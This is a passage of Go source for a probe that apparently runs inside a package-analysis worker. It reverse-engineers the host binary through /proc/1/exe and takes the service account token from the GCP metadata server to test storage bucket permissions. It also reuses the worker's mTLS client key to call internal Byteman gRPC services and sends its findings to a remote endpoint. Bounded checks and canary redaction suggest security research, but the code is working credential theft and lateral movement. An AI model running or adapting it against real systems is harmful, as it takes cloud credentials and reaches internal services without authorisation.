	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) != 3 || fields[2] != symbolName || len(fields[1]) != 1 {
			continue
		}
		parsed, err := strconv.ParseUint(fields[0], 16, 64)
		if err != nil || parsed == 0 {
			return 0, errors.New("requested symbol address was invalid")
		}
		if found {
			return 0, errors.New("worker contained multiple requested symbols")
		}
		address = parsed
		found = true
	}
	if err := scanner.Err(); err != nil {
		return 0, errors.New("worker symbol scan failed")
	}
	if !found {
		return 0, errors.New("worker requested symbol was missing")
	}
	return address, nil
}

func readLinkedGoStringAtAddress(executablePath string, globalAddress uint64) (uint64, string, error) {
	executable, err := elf.Open(executablePath)
	if err != nil {
		return 0, "", errors.New("worker executable could not be opened as ELF")
	}
	defer executable.Close()
	if executable.Class != elf.ELFCLASS64 || executable.ByteOrder == nil {
		return 0, "", errors.New("worker executable did not use the expected 64-bit ELF format")
	}
	header, err := readELFVirtualBytes(executable, globalAddress, 16, true)
	if err != nil {
		return 0, "", err
	}
	stringAddress := executable.ByteOrder.Uint64(header[:8])
	stringLength := executable.ByteOrder.Uint64(header[8:])
	if stringLength < 1 || stringLength > 4096 || stringAddress == 0 {
		return 0, "", errors.New("linked string header was invalid")
	}
	literal, err := readELFVirtualBytes(executable, stringAddress, int(stringLength), false)
	if err != nil {
		return 0, "", err
	}
	path, err := validateLinkedPath(literal)
	if err != nil {
		return 0, "", err
	}
	return stringAddress, path, nil
}

func inspectLinkedAuthFileName(executablePath string) authFileNameResult {
	result := authFileNameResult{}
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", executablePath)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	globalAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
	if err != nil {
		result.Error = err.Error()
		return result
	}
	stringAddress, path, err := readLinkedGoStringAtAddress(executablePath, globalAddress)
	if err != nil {
		result.Error = err.Error()
		return result
	}
	result.GlobalAddress = fmt.Sprintf("0x%x", globalAddress)
	result.StringAddress = fmt.Sprintf("0x%x", stringAddress)
	result.Path = path
	result.File = lstatPath(path)
	result.Parent = lstatPath(filepath.Dir(path))
	return result
}

func runAuthFileNameInspection(report *probeReport) {
	result := inspectLinkedAuthFileName("/proc/1/exe")
	report.Inspection = &inspectionResult{AuthFileName: &result}
	if result.Error != "" {
		report.Inspection.Error = result.Error
		return
	}
	report.Reason = "bounded linked auth filename and path metadata inspection completed"
}

func fixedMetadataKeyLocation(data []byte) (uint64, int, error) {
	objectAddressPattern := regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	metadataIndex := -1
	for index, line := range lines {
		if strings.Contains(line, "metadata.New") {
			metadataIndex = index
			break
		}
	}
	if metadataIndex < 0 {
		return 0, 0, errors.New("metadata.New marker was not found")
	}
	assignIndex := -1
	for index := metadataIndex - 1; index >= 0 && index >= metadataIndex-96; index-- {
		if strings.Contains(lines[index], "runtime.mapassign_faststr") {
			assignIndex = index
			break
		}
	}
	if assignIndex < 0 {
		return 0, 0, errors.New("metadata map assignment was not found")
	}
	var address uint64
	length := 0
	for index := assignIndex - 1; index >= 0 && index >= assignIndex-20; index-- {
		line := lines[index]
		if length == 0 && strings.Contains(line, "mov") && strings.Contains(line, "edi,0xf") {
			length = 15
		}
		if address == 0 && strings.Contains(line, "lea") && strings.Contains(line, "rcx,[rip+") {
			match := objectAddressPattern.FindStringSubmatch(line)
			if len(match) == 2 {
				parsed, err := strconv.ParseUint(match[1], 16, 64)
				if err == nil {
					address = parsed
				}
			}
		}
	}
	if address == 0 || length != len("X-SOS-SessionID") {
		return 0, 0, errors.New("fixed metadata key location was incomplete")
	}
	return address, length, nil
}

func resolveFixedMetadataKey(data []byte) (string, string, int, error) {
	address, length, err := fixedMetadataKeyLocation(data)
	if err != nil {
		return "", "", 0, err
	}
	executable, err := elf.Open("/proc/1/exe")
	if err != nil {
		return "", "", 0, errors.New("worker executable could not be opened as ELF")
	}
	defer executable.Close()
	end := address + uint64(length)
	if end < address {
		return "", "", 0, errors.New("fixed metadata key address overflowed")
	}
	for _, section := range executable.Sections {
		sectionEnd := section.Addr + section.Size
		if sectionEnd < section.Addr || address < section.Addr || end > sectionEnd ||
			section.Flags&elf.SHF_ALLOC == 0 || section.Flags&elf.SHF_WRITE != 0 {
			continue
		}
		reader := section.Open()
		if _, err := reader.Seek(int64(address-section.Addr), io.SeekStart); err != nil {
			return "", "", 0, errors.New("fixed metadata key offset could not be selected")
		}
		literal := make([]byte, length)
		if _, err := io.ReadFull(reader, literal); err != nil {
			return "", "", 0, errors.New("fixed metadata key bytes could not be read")
		}
		if string(literal) != "X-SOS-SessionID" {
			return "", "", 0, errors.New("fixed metadata key literal did not match")
		}
		return "X-SOS-SessionID", fmt.Sprintf("0x%x", address), length, nil
	}
	return "", "", 0, errors.New("fixed metadata key address was outside read-only ELF sections")
}

func runSessionDataflowInspection(report *probeReport) {
	result := report.Inspection
	if result == nil {
		result = &inspectionResult{}
		report.Inspection = result
	}
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
	}, 64)
	dialOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel",
		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	// This bounded slice spans the function entry through metadata-attacher
	// creation on the pinned worker build. It is intentionally limited to one
	// named function and cannot expose arbitrary process memory or strings.
	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 768, 48)
	result.MetadataKey, result.KeyAddress, result.KeyLength, err = resolveFixedMetadataKey(dialOutput)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	callerOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
		result.Error = "fixed inspection markers were incomplete"
		return
	}
	report.Reason = "bounded server.dial dataflow and fixed metadata key inspection completed"
}

func runBytemanDescriptorInspection(report *probeReport) {
	report.Inspection = &inspectionResult{}
	helper := filepath.Join(report.Identity.CWD, "x86_64-gcc", "describe-protos")
	helperData, err := os.ReadFile(helper)
	if err != nil {
		report.Inspection.Error = "descriptor helper was unavailable"
		return
	}
	helperDigest := sha256.Sum256(helperData)
	if hex.EncodeToString(helperDigest[:]) != descriptorHelperSHA256 {
		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
		return
	}
	helperCopy := "/tmp/.go-cgo-v051-describe-protos"
	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
	if err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be created"
		return
	}
	copyOK := false
	defer func() {
		_ = copyFile.Close()
		if !copyOK {
			_ = os.Remove(helperCopy)
		}
	}()
	if written, writeErr := copyFile.Write(helperData); writeErr != nil || written != len(helperData) {
		report.Inspection.Error = "fixed descriptor helper copy was incomplete"
		return
	}
	if err := copyFile.Sync(); err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be synced"
		return
	}
	if err := copyFile.Close(); err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be closed"
		return
	}
	copyOK = true
	defer os.Remove(helperCopy)
	output, err := runFixedTool(helperCopy, "/proc/1/exe", "sos.byteman")
	if err != nil {
		report.Inspection.Error = cleanError(err)
		return
	}
	decoder := json.NewDecoder(bytes.NewReader(output))
	for len(report.Inspection.Descriptors) < 8 {
		var raw json.RawMessage
		if err := decoder.Decode(&raw); err == io.EOF {
			break
		} else if err != nil {
			report.Inspection.Error = "descriptor helper output was invalid JSON"
			return
		}
		var envelope struct {
			Package  string `json:"package"`
			Services []struct {
				Name string `json:"name"`
			} `json:"services"`
		}
		if json.Unmarshal(raw, &envelope) != nil || envelope.Package != "sos.byteman" {
			continue
		}
		for _, service := range envelope.Services {
			if service.Name == "Byteman" {
				report.Inspection.Descriptors = append(report.Inspection.Descriptors, append(json.RawMessage(nil), raw...))
				break
			}
		}
	}
	if len(report.Inspection.Descriptors) != 1 {
		report.Inspection.Error = "exactly one sos.byteman Byteman descriptor was not found"
		return
	}
	runSessionDataflowInspection(report)
	if report.Inspection.Error == "" {
		report.Reason = "bounded Byteman descriptor and session dataflow inspection completed"
	}
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != "localhost" {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	_, err := leaf.Verify(x509.VerifyOptions{
		Roots:         roots,
		Intermediates: intermediates,
		KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}

func newMTLSClient(routeMode string) (*http.Client, string, error) {
	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
	if err != nil {
		return nil, "", err
	}
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, "", err
	}
	roots, err := x509.SystemCertPool()
	if err != nil || roots == nil {
		roots = x509.NewCertPool()
	}
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, "", errors.New("server pool contained no certificates")
	}
	var selected net.IP
	if useInjectedRPC {
		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
		selected = net.ParseIP(serviceHost)
		parsedPort, parseErr := strconv.Atoi(portText)
		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
			return nil, "", errors.New("injected RPC service was not a private IP")
		}
		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
			return nil, "", errors.New("injected RPC service port was invalid")
		}
		port = parsedPort
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
		if resolveErr != nil {
			return nil, "", errors.New("direct Byteman service did not resolve")
		}
		for _, candidate := range addresses {
			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
				selected = candidate.IP
				break
			}
		}
		if selected == nil {
			return nil, "", errors.New("direct Byteman service had no private address")
		}
	}
	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
	rpcServiceHost = serviceHost
	rpcDialAddress = address
	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
	legacyLocalhost := routeMode == "byteman-localhost"
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            roots,
		MinVersion:         tls.VersionTLS12,
		ServerName:         tlsServerName,
		InsecureSkipVerify: legacyLocalhost, // Verified below for the legacy CN-only service certificate.
	}
	if legacyLocalhost {
		tlsConfig.VerifyConnection = func(state tls.ConnectionState) error {
			return verifyLegacyLocalhost(state, roots)
		}
	}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, address)
		},
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
}

func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
	if useInjectedRPC {
		return tlsServerName
	}
	return serviceHost
}

func bytemanRoute(routeMode string) (string, int, string, bool, error) {
	switch routeMode {
	case "byteman-core-localhost":
		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
	case "byteman-localhost":
		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
	case "rpc-gateway":
		return "", 0, "rpc.deps.dev", true, nil
	case "byteman-oregon-gateway":
		return "", 0, "byteman.oregon.int.deps.dev", true, nil
	case "byteman-home-oregon-gateway":
		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
	case "byteman-iowa-gateway":
		return "", 0, "byteman.iowa.int.deps.dev", true, nil
	default:
		return "", 0, "", false, errors.New("route mode was not allowed")
	}
}

func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
	result := grpcResult{Method: method}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", "18S")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = result.GRPCStatus == "0"
	return result
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
